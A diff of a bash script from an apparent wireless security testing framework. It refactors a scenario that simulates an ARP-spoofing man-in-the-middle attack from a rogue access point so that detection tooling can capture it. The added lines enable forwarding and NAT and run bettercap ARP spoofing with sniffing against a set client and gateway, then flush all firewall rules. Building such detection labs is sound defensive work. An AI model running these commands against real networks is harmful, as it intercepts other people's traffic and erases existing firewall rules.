@@ -4,119 +4,79 @@
 BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 CONFIG_DIR="$BASH_DIR/config"
 HELPERS_DIR="$BASH_DIR/helpers"
-SERVICES_DIR="$BASH_DIR/services"
 SCENARIO_DIR="$BASH_DIR/scenarios"
+SERVICES_DIR="$BASH_DIR/services"
+UTILITIES_DIR="$BASH_DIR/utilities"
 
 # ─── Configs ───
 source "$CONFIG_DIR/global.conf"
 source "$CONFIG_DIR/t014.conf"
 
-# ─── Helpers ───
+# ─── Dependencies ───
+source "$HELPERS_DIR/fn_mode.sh"
 source "$HELPERS_DIR/fn_print.sh"
+source "$HELPERS_DIR/fn_prompt.sh"
 
-# Prompt user to proceed
-user_confirmation() {
-    if [[ "$ORCHESTRATION" == "1" ]]; then
-        print_info "Orchestration task"
-        print_blank
-        return 0
-    fi
-    print_prompt "$1 [y/N]: "
-    read -r READY
-    [[ "$READY" != "y" && "$READY" != "Y" ]] && return 1
-    print_blank
-    return 0
-}
-
-# Orchestration wait for go
-wait_for_go() {
-    local GO_FILE="/tmp/watt_go_$1"
-    print_info "Waiting for go signal: $GO_FILE"
-    while [ ! -f "$GO_FILE" ]; do
-        sleep 1
-    done
-    rm -f "$GO_FILE"
-}
-
-# ─── Scenario Introduction ───
+# ─── Show Introduction ───
 print_none "This scenario simulates a man-in-the-middle (MiTM) attack via ARP spoofing, launched from a rogue wireless entry point.  It targets a client and gateway to hijack traffic, enabling packet interception or manipulation."
-print_blank
 
-# ─── Access Point Instructions ───
+confirmation
+
+# ─── Show Pre-reqs ───
 print_section "Scenario Pre-requisites"
 print_none "1. Open Access Point with associated client"
 print_none "2. WSTT full/filtered capture"
 print_blank
 
-# ─── Launch Parameters ───
-print_section "Scenario Parameters"
-print_none "Scenario   : $T014_NAME ($T014_ID)"
+# ─── Show Parameters ───
+print_section "Simulation Parameters"
+print_none "Threat     : $T014_NAME ($T014_ID)"
 print_none "Interface  : $INTERFACE"
 print_none "Tool       : $T014_TOOL"
 print_none "Mode       : $T014_MODE"
-print_blank
 
-# ─── User Confirmation ───
-print_prompt "Proceed [y/N]: "
-read -r READY
-[[ "$READY" != "y" && "$READY" != "Y" ]] && exit 0
-print_blank
+confirmation
 
-# ─── WAPT Coordination ───
-print_section "Access Point & Client Preparation"
-print_action "Launch a OPEN Access Point and associate a client device"
+# ─── Show AP Config ───
+print_section "Access Point / Client Preparation"
+print_action "Launch Access Point and associate a client device"
 print_none "Client IP  : $T014_TARGET_IP"
 print_none "Gateway IP : $T014_TARGET_GW"
 print_none "Forward IF : $T014_FWD_INTERFACE"
-print_blank
 
-# ─── User Confirmation ───
-if [[ "$ORCHESTRATION" == "1" ]]; then
-    touch /tmp/watt_ready_ap
-    wait_for_go "ap"
-else
-    user_confirmation "Confirm Access Point and client are active" || exit 0
-fi
+confirmation
 
-# ─── WSTT Coordination ───
+# ─── Show Capture Config ───
 print_section "WSTT Capture Preparation"
 print_action "Launch a full or filtered capture using WSTT"
 print_none "BSSID      : $T014_BSSID"
 print_none "Channel    : $T014_CHANNEL"
 print_none "Duration   : $T014_DURATION seconds"
-print_blank
 
-# ─── User / Orchestration Sync ───
-if [[ "$ORCHESTRATION" == "1" ]]; then
-    touch /tmp/watt_ready_capture
-    wait_for_go "capture"
-else
-    user_confirmation "Confirm capturing is active" || exit 0
-fi
+confirmation
 
-# ─── Signal Cleanup on Exit ───
-cleanup() {
-    rm -f /tmp/watt_ready_t014
-    rm -f /tmp/watt_ready_capture
-}
-trap cleanup EXIT
-
-# ─── Attack Execution ───
+# ─── Run Simulation ───
+clear
 print_section "Simulation Running"
-print_action "Launching simulation"
-print_waiting "Running $T014_NAME ($T014_ID)"
-touch /tmp/watt_ready_t014  # Ready marker
-if [[ "$ORCHESTRATION" == "1" ]]; then
-    bash "$SCENARIO_DIR/exec_t014.sh" --wait
-else
-    bash "$SCENARIO_DIR/exec_t014.sh"
-fi
-print_success "Simulation complete"
+
+ensure_managed_mode
+print_blank
+print_action "Starting NAT: Client Internet access ENABLED"
+sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
+sudo iptables -t nat -A POSTROUTING -o $T014_FWD_INTERFACE -j MASQUERADE
+print_blank
+print_waiting "Launching ARP Spoofing from Wireless Entry Point"
+sudo timeout "$T014_DURATION" bettercap -iface "$INTERFACE" -eval "set arp.spoof.targets $T014_TARGET_IP; set arp.spoof.gateway $T014_TARGET_GW; arp.spoof on; net.sniff on"
+EXIT_CODE=$?
+print_action "Stopping NAT"
+sudo iptables -F
+sudo iptables -t nat -F
 print_blank
 
-# ─── Post-Simulation Instructions ───
-print_section "Simulation Complete"
-print_action "Run WSTT detection scripts against the saved PCAP file"
-print_action "Review the capture in Wireshark (filter: $T014_FILTER_HINT)"
+if (( EXIT_CODE == 0 )); then
+    print_success "Simulation completed"
+else
+    print_fail "Simulation stopped (Code: $EXIT_CODE)"
+fi
 
 exit 0
